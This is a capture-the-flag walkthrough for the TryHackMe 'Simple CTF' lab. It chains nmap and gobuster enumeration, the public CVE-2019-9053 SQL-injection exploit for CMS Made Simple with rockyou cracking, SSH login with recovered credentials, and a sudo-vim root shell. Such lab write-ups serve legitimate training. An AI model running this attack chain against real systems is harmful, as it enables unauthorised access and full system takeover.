
# TryHackMe – Simple CTF Write-up

## Nmap Scan
### Command: 
 nmap -sV IP
### Output:

 ![Scan Nmap](images\NmapScan.png)

## Directory enumeration 
### Command:
 gobuster dir -u http://IP -w /usr/share/wordlists/dirb/common.txt
### Output:
 http://IP/simple/  
 → CMS Made Simple 
### Note:
 CMS Made Simple (CMSMS) is an open-source content management system written in PHP.
 It allows users to easily create and manage websites through a web interface.

## Vulnerability Research
### Command:
 searchsploit cms made simple
### Output:

 ![alt text](images\Search.png)

### Command:
 cat /usr/share/exploitdb/exploits/php/webapps/46635.py
 found: CVE-2019-9053
### Note:
 CVE-2019-9053 is an unauthenticated SQL injection vulnerability in the News module of CMS Made Simple (≤ 2.2.9). It allows injecting SQL queries that extract sensitive data from the database, including usernames, password hashes, salts, and email addresses.

## Exploitation
### Command:
 python2 46635.py -u http://IP/simple/ -c -w /usr/share/wordlists/rockyou.txt 
### Output:

 ![alt text](images\exploit.png)

### explanation:
 The script attempts to crack the extracted password hashes offline using the rockyou.txt wordlist to reveal valid credentials for access.

## 5. SSH Access
### Command:
 ssh mitch@IP -P 2222
 password: secret
### Output:

 ![alt text](images\sshAccess.png)

## User Enumeration
 Searching for an other user in the home directory
### Command:
 ls /home
### Output:
 user found: sunbath

## Root Access
### Command:
 sudo -l
 This command lists the programs the current user (mitch) is allowed to run with sudo.
### Output:
 User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
### explanation:
 mitch can execute /usr/bin/vim as root without providing a password.
 Vim is not just a text editor it allows executing system commands from inside the editor.
### Command:
 sudo vim (Launch Vim as root)
 enter: ":!bash"
### Note:
 This tells Vim to launch a Bash shell. Since Vim is running as root, the spawned shell also runs as root.
### Output:

![alt text](images\rootAcces.png)



 








